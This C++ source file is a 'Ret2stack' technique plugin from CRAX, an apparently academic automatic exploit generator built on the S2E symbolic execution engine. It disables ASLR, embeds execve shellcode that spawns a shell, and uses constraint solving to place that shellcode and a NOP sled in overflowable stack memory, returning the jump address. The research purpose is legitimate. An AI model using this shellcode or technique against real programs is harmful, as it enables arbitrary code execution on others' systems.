// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>

#include <cassert>
#include <memory>

#include "Ret2stack.h"

using namespace klee;

namespace s2e::plugins::crax {

Ret2stack::Ret2stack() : Technique() {
    Exploit &exploit = g_crax->getExploit();
    Process &process = exploit.getProcess();
    process.setAslrEnabled(false);
}


std::vector<RopPayload> Ret2stack::getRopPayloadList() const {
    uint64_t retAddr = addShellcodeConstraints();

    if (!retAddr) {
        log<WARN>() << "Cannot add shellcode constraints\n";
        return {};
    }
 
    RopPayload payload = {
        nullptr,  // RBP
        ConstantExpr::create(retAddr, 48),
    };

    return { payload };
}

uint64_t Ret2stack::addShellcodeConstraints() const {
    S2EExecutionState *state = g_crax->getCurrentState();

    uint64_t regionBase = 0;
    uint64_t shellcodeAddr = 0;
    uint64_t nopSledAddr = 0;

    // http://shell-storm.org/shellcode/files/shellcode-806.php
    std::string shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7"
                            "\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

    std::map<uint64_t, uint64_t> symbolicMemoryMap = mem().getSymbolicMemory();
    log<WARN>() << "Symbolic arrays: found " << symbolicMemoryMap.size() << " candidates\n";

    for (auto rit = symbolicMemoryMap.rbegin(); rit != symbolicMemoryMap.rend(); rit++) {
        const auto &region = *rit;

        log<WARN>()
            << "Found symbolic array @" << hexval(region.first)
            << ", size = " << region.second << '\n';

        // We've found a symbolic memory region which is large enough
        // to hold our shellcode.
        if (region.second >= shellcode.size()) {
            std::unique_ptr<S2EExecutionState> clonedState(
                    static_cast<S2EExecutionState *>(state->clone()));

            clonedState->concolics = Assignment::create(state->concolics);

            // Build shellcode constraints.
            ref<Expr> shellcodeConstraints = ConstantExpr::create(1, Expr::Bool);

            for (size_t i = 0; i < shellcode.size(); i++) {
                uint64_t addr = region.first + region.second - shellcode.size() - 6 + i;
                log<WARN>() << "addr = " << hexval(addr) << '\n';
                auto ce = ConstantExpr::create((uint8_t) shellcode[i], Expr::Int8);
                auto constraint = EqExpr::create(mem().readSymbolic(addr, Expr::Int8), ce);
                shellcodeConstraints = AndExpr::create(shellcodeConstraints, constraint);
            }

            if (clonedState->addConstraint(shellcodeConstraints, true)) {
                bool ok = state->addConstraint(shellcodeConstraints, true);
                assert(ok);

                log<WARN>() << "shellcode constraints added\n";
                regionBase = region.first;
                shellcodeAddr = region.first + region.second - shellcode.size() - 6;
                break;
            }
        }
    }

    if (!shellcodeAddr) {
        return 0;
    }

    nopSledAddr = shellcodeAddr - 1;

    // Add NOP sled constraints.
    while (true) {
        auto nop = ConstantExpr::create(0x90, Expr::Int8);

        if (nopSledAddr < regionBase) {
            nopSledAddr++;
            break;
        }
        
        if (!RopPayloadBuilder::addMemoryConstraint(*state, nopSledAddr, nop)) {
            nopSledAddr++;
            break;
        }

        nopSledAddr--;
    }

    return nopSledAddr;
}

}  // namespace s2e::plugins::crax
